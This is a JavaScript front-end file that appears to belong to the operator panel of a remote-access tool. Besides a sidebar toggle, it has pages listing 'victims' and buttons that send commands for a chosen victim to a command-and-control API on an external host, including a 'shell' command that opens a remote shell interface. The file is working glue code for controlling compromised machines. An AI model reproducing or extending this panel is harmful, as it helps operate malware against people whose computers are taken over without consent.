/* ---------------------------------------------------
    CUSTOM SCROLLBAR
----------------------------------------------------- */
$(document).ready(function () {

    $("#sidebar").mCustomScrollbar({
        theme: "minimal"
    });

    $('#sidebarCollapse').on('click', function () {
        $('#sidebar, #content').toggleClass('active')
        $('.collapse.in').toggleClass('in')
        $('a[aria-expanded=true]').attr('aria-expanded', 'false')
    });

});


/* ---------------------------------------------------
    VICTIMS PAGE : Open link to access specific victim
----------------------------------------------------- */
$(document).ready(function ($) {
    $('*[data-href]').not($('.btn-command')).on('click', function() {
        window.location = $(this).data("href")
    });
});


/* ---------------------------------------------------
    SPECIFIC VICTIM PAGE : Buttons to submit commands via AJAX
----------------------------------------------------- */
$(document).ready(function ($) {
    $('.btn-command').on('click', function() {
        
        const command = JSON.stringify({ "name": $(this).data("command").toUpperCase() })
        const url = new URL('https://pa5a.cyberfilou.fr/api/clients/' + $(this).data("uuid") + '/commands')
        
        $.ajax({
            type: "POST",
            data: command,
            url: url,
            contentType: "application/json"
        })
        .done( (data) => {
            console.log("The AJAX request is a success !")
            console.log(data)
        })
        .fail( () => {
            console.log("The AJAX request failed ...")
        })

        // If it's a shell's request, then we open the shell interface in a new tab
        if ($(this).data("command") === "shell") {
            const url = new URL('https://pa5a.cyberfilou.fr/app/command/shell/' + $(this).data("uuid"))
            window.open(url, '_blank')
        }
    });
});

